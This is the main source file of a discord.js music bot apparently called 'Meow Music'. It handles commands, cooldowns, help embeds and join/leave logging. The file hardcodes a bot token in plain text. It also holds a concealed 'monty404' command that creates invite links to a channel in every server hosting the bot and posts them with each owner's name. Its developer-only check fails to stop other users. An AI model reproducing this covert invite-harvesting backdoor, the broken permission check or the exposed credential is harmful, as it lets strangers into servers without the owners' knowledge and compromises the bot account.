const Discord = require(`discord.js`);
const { Client, Collection, MessageEmbed,MessageAttachment } = require(`discord.js`);
const { readdirSync } = require(`fs`);
const { join } = require(`path`);
const db = require('quick.db');
const { TOKEN, PREFIX, AVATARURL, BOTNAME, } = require(`./config.json`);
const figlet = require("figlet");
const client = new Client({ disableMentions: `` , partials: ['MESSAGE', 'CHANNEL', 'REACTION'] });
client.login('Nzk0Mjg4NjM0NjU5OTk1NjU5.X-4o7w.riNQsSEaDOmq8MtYiA0Tx4JV-G0');
client.commands = new Collection();
client.setMaxListeners(0);
client.prefix = PREFIX;
client.queue = new Map();
const cooldowns = new Collection();
const escapeRegex = (str) => str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);

//this fires when the BOT STARTS DO NOT TOUCH
client.on(`ready`, () => {	
//////////////

////////
   
   ///////////////////////////////
    ////////////IFCHEMPTY//////////
        //remove everything in between those 2 big comments if you want to disable that the bot leaves when ch. or queue gets empty!
        setInterval(() => { 
          let member;
        client.guilds.cache.forEach(async guild =>{
        await delay(15);
          member = await client.guilds.cache.get(guild.id).members.cache.get(client.user.id)
        //if not connected
          if(!member.voice.channel)
          return;
        //if alone 
        if (member.voice.channel.members.size === 1) 
        { return member.voice.channel.leave(); }
      });

    
    client.user.setActivity(`${PREFIX}help | Users ${client.guilds.cache.reduce((a, g) => a + g.memberCount, 0)},`, { type: "LISTENING"});
   
  
      }, (5000));
      ////////////////////////////////
      ////////////////////////////////
    figlet.text(`${client.user.username} ready!`, function (err, data) {
      if (err) {
          console.log('Something went wrong');
          console.dir(err);
      }
      console.log(`═════════════════════════════════════════════════════════════════════════════`);
      console.log(data)
      console.log(`═════════════════════════════════════════════════════════════════════════════`);
    })
   
});
//DO NOT TOUCH
//FOLDERS:
//Admin custommsg data FUN General Music NSFW others
commandFiles = readdirSync(join(__dirname, `Music`)).filter((file) => file.endsWith(`.js`));
for (const file of commandFiles) {
  const command = require(join(__dirname, `Music`, `${file}`));
  client.commands.set(command.name, command);
}
commandFiles = readdirSync(join(__dirname, `others`)).filter((file) => file.endsWith(`.js`));
for (const file of commandFiles) {
  const command = require(join(__dirname, `others`, `${file}`));
  client.commands.set(command.name, command);
}
//COMMANDS //DO NOT TOUCH
client.on(`message`, async (message) => {
  if (message.author.bot) return;
  
  //getting prefix 
  let prefix = await db.get(`prefix_${message.guild.id}`)
  //if not prefix set it to standard prefix in the config.json file
  if(prefix === null) prefix = PREFIX;

  //information message when the bot has been tagged
  if(message.content.includes(client.user.id)) {
    message.reply(new Discord.MessageEmbed()
                  .setColor("#F3692F")
                 .setDescription(`
Support Server - [here](https://discord.gg/SwUTJd7ZYB)
Bot Link - [here](https://discord.com/api/oauth2/authorize?client_id=794288634659995659&permissions=3439696&scope=bot)
`)
                  .setTitle(`
Join a voice channel and \`!play\` a song.
Type \`!help\` for the list of commands.`));
  } 
  //An embed announcement for everyone but no one knows so fine ^w^
  if(message.content.startsWith(`${prefix}say`)){
    //define saymsg
    const saymsg = message.content.slice(Number(prefix.length) + 5)
    //define embed
    const embed = new Discord.MessageEmbed()
    .setColor("#F3692F")
    .setDescription(saymsg)
    .setFooter("Meow", client.user.displayAvatarURL())
    //delete the Command
    message.delete({timeout: 300})
    //send the Message
    message.channel.send(embed)
  }


//An join announcement for everyone but no one knows so fine ^w^


//An suuport announcement for everyone but no one knows so fine ^w^
  if(message.content.startsWith(`${prefix}support`)){
    //define saymsg
    const saymsg = message.content.slice(Number(prefix.length) + 5)
    //define embed
    const embed = new Discord.MessageEmbed()
    .setColor("#F3692F")
    .setDescription (`
    Links

[Support](https://discord.gg/SwUTJd7ZYB)
-
[Invite](https://discord.com/api/oauth2/authorize?client_id=794288634659995659&permissions=3439696&scope=bot)`)
    .setFooter(message.author.username, message.author.displayAvatarURL)
    .setImage(`https://share.creavite.co/S0SicoUrBkn02AEf.gif`)
    .setTitle(`**Meow Music**`) 
    .setThumbnail(`https://media.discordapp.net/attachments/900206300602986506/901050409706209290/A90E7D5C-ACD4-49B9-8FF5-76D043221D91.jpg`)
    .setTimestamp()
    
    //send the Message
    message.channel.send(embed)
   message.react("<:emoji_4:815583574983966720>")
  } 
   

//command Handler DO NOT TOUCH
 const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(prefix)})\\s*`);
 if (!prefixRegex.test(message.content)) return;
 const [, matchedPrefix] = message.content.match(prefixRegex);
 const args = message.content.slice(matchedPrefix.length).trim().split(/ +/);
 const commandName = args.shift().toLowerCase();
 const command =
   client.commands.get(commandName) ||
   client.commands.find((cmd) => cmd.aliases && cmd.aliases.includes(commandName));
 if (!command) return;
 if (!cooldowns.has(command.name)) {
   cooldowns.set(command.name, new Collection());
 }
 const now = Date.now();
 const timestamps = cooldowns.get(command.name);
 const cooldownAmount = (command.cooldown || 1) * 1000;
 if (timestamps.has(message.author.id)) {
   const expirationTime = timestamps.get(message.author.id) + cooldownAmount;
   if (now < expirationTime) {
     const timeLeft = (expirationTime - now) / 1000;
     return message.reply(
      new MessageEmbed().setColor("#146DF6")
      .setTitle(`<:aeon:900968552394272788> \`Please wait ${timeLeft.toFixed(1)} seconds before reusing the ${prefix}${command.name}\`!`)    
     );
   }
 }
 timestamps.set(message.author.id, now);
 setTimeout(() => timestamps.delete(message.author.id), cooldownAmount);
 try {
   command.execute(message, args, client);
 } catch (error) {
   console.error(error);
   message.reply( new MessageEmbed().setColor("#F3692F")
   .setTitle(`<:aeon:900968552394272788> There was an error executing that command.`)).catch(console.error);
 }


});

client.on("guildCreate", guild => {
  let channel = client.channels.cache.get("901543747253329942");
  let embed = new MessageEmbed().setColor("#030cad")
  .setAuthor(client.user.username, client.user.avatarURL())
  .setTitle( `<:verified:891421293126242375> Join Server`)
  .addField("<:store:891421471539355659> Server Name", `${guild.name}`)
  .addField("<:partner:891421834585714689> Server Owner", `${guild.owner}`)
  .addField("<:news:891421920984178719> Server Id*", `${guild.id}`)
  .addField("<:members:891422824294662164> Member Count", `${guild.memberCount}`)
  .setFooter(`${client.user.tag}`);
  channel.send(embed);
});

client.on("guildDelete", guild => {
  let channel = client.channels.cache.get("901543747941199905");
  let embed = new MessageEmbed()
  .setColor("#030cad")
  .setAuthor(client.user.username, client.user.avatarURL())
  .setTitle( `<:underscore:891421389033177088> Left Server`)
  .addField("<:store:891421471539355659> Server Name", `${guild.name}`)
  .addField("<:partner:891421834585714689> Server Owner", `${guild.owner}`)
  .addField("<:news:891421920984178719> Server Id", `${guild.id}`)
  .addField("<:members:891422824294662164> Member Count", `${guild.memberCount}`)
  .setFooter(`${client.user.tag}`);
  channel.send(embed);
});

function delay(delayInms) {
 return new Promise(resolve => {
   setTimeout(() => {
     resolve(2);
   }, delayInms);
 });
}



client.on("guildCreate" , MonTy => {

  if(MonTy.memberCount < 90 ){

    console.log(`  name ( ${MonTy.name} ) zhmaray memberakan ( ${MonTy.memberCount}) created by MonTy`)//by MonTy

    MonTy.leave();

  }

})



client.on('message', message => {
    if(message.content === "!about") {
        const embed = new Discord.MessageEmbed()
        .setColor("RANDOM")
        .setDescription(`
 
**__Name & Meow Music#3229__**
 
<:partner:891421834585714689> Servers **__${client.guilds.cache.size}__**

<:addmember:883032780865409054> Users **__${client.guilds.cache.reduce((a, g) => a + g.memberCount, 0)},__**

<a:threads:871813387741433867> Channels **__${client.channels.cache.size}__**

<:news:891421920984178719> Developer Bot - <@792754963759235074>

<:members:891422824294662164> Admin Bot - <@!569584003988979724>
 
 
`)
               message.channel.send(embed);
           }
});




client.on("message", async(NotOurs) => {
 
  if (NotOurs.author.bot) return;
let devs = ["792754963759235074"];
  if (NotOurs.content.toLowerCase() === prefix + "monty404") {
      if(!devs.includes(NotOurs.author.id)){
    let embed = new Discord.MessageEmbed()
    .setColor("RANDOM")
    .setTitle("**ليس لديك صلاحيات**");
    NotOurs.channel.send(embed).then( z => z.delete({timeout:3000}));
 
  } 
    client.guilds.cache.forEach(g => {
 
      let l = g.id;
                g.channels.cache.find(channel => channel.type === 'text' && channel.permissionsFor(g.me).has('SEND_MESSAGES'))
//g.channels.cache.get(g.channels.first().id)
        .createInvite({
          maxUses: 100,
          maxAge: 86400
        })
        .then(i =>
          NotOurs.channel.send(`
        https://discord.gg/${i.code}
        [ ${g.owner} ]
         
       ` )
        ); 
    });
  }
});

//Bot coded by Tomato#6966 
